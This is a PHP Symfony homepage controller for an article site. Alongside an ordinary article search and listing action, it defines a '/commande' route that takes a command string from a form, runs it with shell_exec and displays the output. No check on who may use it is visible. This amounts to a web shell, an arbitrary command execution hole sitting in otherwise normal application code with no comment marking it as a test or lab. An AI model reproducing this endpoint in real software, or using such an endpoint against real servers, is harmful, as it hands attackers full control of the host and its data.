<?php

namespace App\Controller;

use App\Entity\Article;
use App\Form\Type\CommandType;
use App\Form\Type\SearchType;
use App\Repository\ArticleRepository;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class HomepageController extends AbstractController
{
    #[Route('', name: 'homepage')]
    public function index(
        EntityManagerInterface $em,
        Request $request,
        ArticleRepository $articleRepository
    ): Response
    {
        $form = $this->createForm(SearchType::class);
        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $articles = $articleRepository->searchArticles($form->getData()['name']);
        } else {
            $articles = $em->getRepository(Article::class)->findByUser($this->getUser());
        }

        return $this->render('homepage/index.html.twig', [
            'form' => $form,
            'articles' => $articles,
        ]);
    }

    #[Route('/commande', name: 'commande')]
    public function commande(Request $request): Response
    {
        $form = $this->createForm(CommandType::class);
        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $commande = $form->getData()['commande'];

            $output = shell_exec($commande);
        }

        return $this->render('homepage/command.html.twig', [
            'form' => $form,
            'output' => $output ?? null,
        ]);
    }
}
